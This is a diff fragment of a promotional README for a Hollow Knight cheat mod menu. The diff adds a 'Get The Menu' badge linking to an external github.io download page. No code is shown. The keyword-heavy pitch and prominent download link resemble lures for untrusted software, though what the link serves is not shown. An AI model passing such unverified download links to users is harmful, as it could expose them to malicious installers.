@@ -4,7 +4,7 @@
 
 **Hollow Knight** is already a deep and challenging metroidvania, but modders have taken it even further. With a **Hollow Knight mod menu**, you can unlock cheats, customize abilities, and even change the way the game plays. From **god mode** and **infinite geo** to fun mods that alter charms and add new mechanics, mod menus give you total freedom over how you experience Hallownest.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Menu-blueviolet)](https://hollow-knight-mod-menu.github.io/.github/)
 ---
 
 ## What Is a Mod Menu in Hollow Knight?
